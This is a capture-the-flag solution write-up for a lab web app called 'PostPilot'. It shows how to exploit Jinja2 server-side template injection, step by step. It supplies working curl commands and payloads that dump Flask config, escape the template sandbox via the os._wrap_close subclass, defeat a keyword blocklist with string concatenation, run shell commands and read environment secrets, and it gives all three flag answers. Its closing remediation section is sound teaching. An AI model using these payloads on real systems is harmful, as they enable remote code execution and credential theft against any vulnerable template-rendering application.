# 🚩 PostPilot — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving. Kept as a personal write-up, not to read while playing.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Recon — confirm SSTI

The `/preview` form claims to only substitute `{{ name }}` / `{{ order_id }}` /
`{{ company }}`. Prove it's really evaluating expressions:

```bash
curl -s localhost:8081/preview --data-urlencode 'template={{ 7*7 }}'
# -> preview shows 49, not the literal "{{ 7*7 }}"
```

`49` means your input is compiled and executed as a **Jinja2** template, not
string-substituted. That's SSTI. Everything else follows from it.

## Flag 1 — template-context leak (`FLAG{ss7i_c0nf1g_c0nt3xt_l34k}`)

Flask injects its `config` object into every template context. You control the
template, so you can read it:

```bash
curl -s localhost:8081/preview --data-urlencode 'template={{ config.items() }}'
```

The dump includes `SUPPORT_PIN` → **Flag 1**. (`{{ config }}` also works; also
worth trying `{{ request }}`, `{{ self.__dict__ }}` to see what else is in reach.)

**Lesson:** SSTI isn't "just" reflected output — it hands the attacker every
object the template engine can see, including framework config (secret keys, DB
URLs, tokens). No code execution required for this stage.

## The blocklist (why the obvious RCE fails)

The app rejects any template containing `import`, `os.`, ` os`, `system`,
`popen`, `subprocess`, `eval`, or `exec`. So the textbook payloads are all dead:

- `{{ ''.__class__...os.popen('id') }}` → blocked (`os.`, `popen`)
- `{{ lipsum.__globals__['os'].system('id') }}` → blocked (`system`)
- `{{ ...__import__('os')... }}` → blocked (`import`, ` os`)

And a second wrinkle: **`subprocess` is never imported by this app**, so the
usual "find `Popen` in `__subclasses__()`" gadget finds nothing. Two ways this
forces you to level up:

1. Reach code execution through the **`os` module**, which *is* imported — via
   the `os._wrap_close` class that shows up in the subclass graph.
2. Get past the keyword filter with **string concatenation**, so the blocked
   word never literally appears in your payload.

## Flag 2 — sandbox escape → RCE → file read (`FLAG{j1nj4_subcl4ss_rc3_pwn3d}`)

Walk the object graph from any string to `object`, enumerate its subclasses, and
pick the one whose `__init__.__globals__` is the **os module namespace** — that's
`_wrap_close`. From those globals grab `popen` (spelled as `'po'+'pen'` to dodge
the filter) and run a command:

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ c.__init__.__globals__['po'+'pen']('cat /srv/flag_rce.txt').read() }}{% endif %}{% endfor %}
```

```bash
curl -s localhost:8081/preview --data-urlencode "template={% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ c.__init__.__globals__['po'+'pen']('cat /srv/flag_rce.txt').read() }}{% endif %}{% endfor %}"
```

Preview prints the contents of `/srv/flag_rce.txt` → **Flag 2**. No URL ever
serves that file; you read it because you're now running commands on the box.

**Notes / robustness:**
- Selecting by `c.__name__ == '_wrap_close'` instead of a hardcoded numeric
  index is deliberate — subclass ordering shifts between Python versions, so
  matching by name is the portable habit.
- `'po'+'pen'` is the whole bypass point: filters that blocklist keywords lose to
  trivial concatenation (`|attr('sys'+'tem')`, `['__cla'+'ss__']`, etc. are the
  same trick).

## Flag 3 — post-exploitation → environment loot (`FLAG{rc3_3nv_var_l00t3d_gg}`)

Code execution is the tool, not the trophy. The first thing a real operator does
after popping a shell is rifle the process **environment**, where apps stash
credentials, cloud keys, and tokens. Same gadget, different command:

```bash
curl -s localhost:8081/preview --data-urlencode "template={% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ c.__init__.__globals__['po'+'pen']('env').read() }}{% endif %}{% endfor %}"
```

The `env` output contains `POSTPILOT_ROOT_SECRET` → **Flag 3**. (Equivalent:
run `cat /proc/self/environ`, or pull `getenv`/`environ` straight from the same
os globals dict.)

**Lesson:** RCE's real impact is everything it unlocks — secrets in env vars,
files, adjacent services, lateral movement. "It only previews a message" is how
these get shipped.

---

## Root cause & the actual fix

Never render attacker-controlled input as a template. The blocklist is security
theatre — it lost to `'po'+'pen'`. Real fixes:

- **Don't template user input at all.** For placeholder substitution use a plain,
  non-evaluating mechanism (`str.format_map` with a controlled dict, or an
  explicit allowlist of field names).
- If you *must* evaluate templates, use Jinja2's **`SandboxedEnvironment`** (and
  know even that has had escapes — prefer not templating untrusted input).
- Defence in depth: run the app as a **non-root user**, drop it in a minimal
  container, and keep secrets out of env vars where a single RCE scoops them all.

### Full flag list
1. `FLAG{ss7i_c0nf1g_c0nt3xt_l34k}`
2. `FLAG{j1nj4_subcl4ss_rc3_pwn3d}`
3. `FLAG{rc3_3nv_var_l00t3d_gg}`
